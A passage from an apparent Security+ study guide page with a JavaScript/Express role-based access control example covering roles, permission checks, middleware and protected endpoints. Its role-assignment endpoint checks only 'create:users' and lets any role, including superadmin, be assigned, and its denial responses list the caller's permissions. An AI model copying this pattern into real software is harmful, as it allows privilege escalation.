      'delete:users',
      'read:admin_panel',
      'read:reports',
      'generate:reports'
    ]);
    
    this.createRole('superadmin', 'Super Administrator', [
      ...this.roles.get('admin').permissions,
      'manage:system'
    ]);
  }
  
  // Create a new role
  createRole(roleId, name, permissions = []) {
    this.roles.set(roleId, {
      id: roleId,
      name: name,
      permissions: permissions,
      createdAt: new Date()
    });
  }
  
  // Assign role to user
  assignRole(userId, roleId) {
    if (!this.roles.has(roleId)) {
      throw new Error(`Role ${roleId} does not exist`);
    }
    
    if (!this.userRoles.has(userId)) {
      this.userRoles.set(userId, []);
    }
    
    const userRoles = this.userRoles.get(userId);
    if (!userRoles.includes(roleId)) {
      userRoles.push(roleId);
    }
  }
  
  // Remove role from user
  removeRole(userId, roleId) {
    if (this.userRoles.has(userId)) {
      const userRoles = this.userRoles.get(userId);
      const index = userRoles.indexOf(roleId);
      if (index > -1) {
        userRoles.splice(index, 1);
      }
    }
  }
  
  // Check if user has permission
  hasPermission(userId, permission) {
    if (!this.userRoles.has(userId)) {
      return false;
    }
    
    const userRoles = this.userRoles.get(userId);
    
    for (const roleId of userRoles) {
      const role = this.roles.get(roleId);
      if (role && role.permissions.includes(permission)) {
        return true;
      }
    }
    
    return false;
  }
  
  // Get all permissions for user
  getUserPermissions(userId) {
    if (!this.userRoles.has(userId)) {
      return [];
    }
    
    const permissions = new Set();
    const userRoles = this.userRoles.get(userId);
    
    for (const roleId of userRoles) {
      const role = this.roles.get(roleId);
      if (role) {
        role.permissions.forEach(permission => permissions.add(permission));
      }
    }
    
    return Array.from(permissions);
  }
  
  // Get permission description
  getPermissionDescription(permission) {
    const descriptions = {
      'read:own_profile': 'Read own user profile',
      'update:own_profile': 'Update own user profile',
      'read:users': 'Read user information',
      'create:users': 'Create new users',
      'update:users': 'Update user information',
      'delete:users': 'Delete users',
      'read:admin_panel': 'Access administrative interface',
      'manage:system': 'System administration and configuration',
      'read:reports': 'View reports and analytics',
      'generate:reports': 'Generate new reports'
    };
    
    return descriptions[permission] || 'Unknown permission';
  }
}

// Initialize RBAC system
const rbac = new RBACSystem();

// RBAC middleware
const rbacMiddleware = {
  // Check if user has required permission
  requirePermission: (permission) => {
    return (req, res, next) => {
      const userId = req.user.id;
      
      if (!rbac.hasPermission(userId, permission)) {
        return res.status(403).json({
          error: 'Access denied',
          message: `Permission '${permission}' required`,
          userPermissions: rbac.getUserPermissions(userId)
        });
      }
      
      next();
    };
  },
  
  // Check if user has any of the required permissions
  requireAnyPermission: (permissions) => {
    return (req, res, next) => {
      const userId = req.user.id;
      
      const hasAnyPermission = permissions.some(permission => 
        rbac.hasPermission(userId, permission)
      );
      
      if (!hasAnyPermission) {
        return res.status(403).json({
          error: 'Access denied',
          message: `One of these permissions required: ${permissions.join(', ')}`,
          userPermissions: rbac.getUserPermissions(userId)
        });
      }
      
      next();
    };
  }
};

// RBAC management endpoints
app.post('/api/admin/users/:userId/roles', 
  authenticateToken,
  rbacMiddleware.requirePermission('create:users'),
  (req, res) => {
    const { userId } = req.params;
    const { roleId } = req.body;
    
    try {
      rbac.assignRole(userId, roleId);
      res.json({
        success: true,
        message: `Role ${roleId} assigned to user ${userId}`,
        userPermissions: rbac.getUserPermissions(userId)
      });
    } catch (error) {
      res.status(400).json({
        error: 'Role assignment failed',
        message: error.message
      });
    }
  }
);

// Protected endpoints with RBAC
app.get('/api/users', 
  authenticateToken,
  rbacMiddleware.requirePermission('read:users'),
  (req, res) => {
    res.json({ message: 'User list retrieved', users: [] });
  }
);

app.post('/api/users', 
  authenticateToken,
  rbacMiddleware.requirePermission('create:users'),
  (req, res) => {
    res.json({ message: 'User created successfully' });
  }
);

app.delete('/api/users/:id', 
  authenticateToken,
  rbacMiddleware.requirePermission('delete:users'),
  (req, res) => {
    res.json({ message: 'User deleted successfully' });
  }
);

app.get('/api/admin/dashboard', 
  authenticateToken,
  rbacMiddleware.requireAnyPermission(['read:admin_panel', 'manage:system']),
  (req, res) => {
    res.json({ 
      message: 'Admin dashboard data',
      userPermissions: rbac.getUserPermissions(req.user.id)
    });
  }
);

// Test RBAC setup
const testRBAC = () => {
  // Create test users with different roles
  rbac.assignRole('user1', 'user');
  rbac.assignRole('user2', 'moderator');
  rbac.assignRole('user3', 'admin');
  
  console.log('RBAC Test Results:');
  console.log('User1 (user role) can read users:', rbac.hasPermission('user1', 'read:users'));
  console.log('User2 (moderator role) can read users:', rbac.hasPermission('user2', 'read:users'));
  console.log('User3 (admin role) can delete users:', rbac.hasPermission('user3', 'delete:users'));
  console.log('User1 permissions:', rbac.getUserPermissions('user1'));
  console.log('User3 permissions:', rbac.getUserPermissions('user3'));
};

// testRBAC();
```

---

## 📍 Navigation

- ← Previous: [Study Resources](./study-resources.md)
- → Next: [Remote Work Considerations](./remote-work-considerations.md)
- ↑ Back to: [Security+ Certification Overview](./README.md)